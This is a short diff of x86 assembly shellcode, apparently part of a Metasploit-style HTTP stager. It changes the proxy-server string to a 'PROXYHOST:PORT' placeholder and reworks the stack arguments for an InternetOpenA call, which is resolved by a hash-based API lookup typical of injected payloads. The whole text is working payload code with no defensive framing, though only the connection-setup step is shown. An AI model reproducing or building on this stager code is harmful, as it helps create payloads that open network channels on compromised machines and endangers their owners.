@@ -19,17 +19,17 @@ load_wininet:
 call internetopen
 
 proxy_server_name:
-	db "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:55555",0x00
+	db "PROXYHOST:PORT",0x00
 
 internetopen:
-  mov ecx, esp
+  pop ecx                ; pointer to proxy_server_name
   xor edi,edi
   push edi               ; DWORD dwFlags
-  push edi               ; LPCTSTR lpszProxyBypass
+  push esp               ; LPCTSTR lpszProxyBypass (empty)
   push ecx               ; LPCTSTR lpszProxyName
   push byte 3            ; DWORD dwAccessType (INTERNET_OPEN_TYPE_PROXY  = 3)
   push byte 0            ; NULL pointer  
-  push esp               ; LPCTSTR lpszAgent ("\x00")
+;  push esp               ; LPCTSTR lpszAgent ("\x00") // doesn't seem to work with this
   push 0xA779563A        ; hash( "wininet.dll", "InternetOpenA" )
   call ebp
 
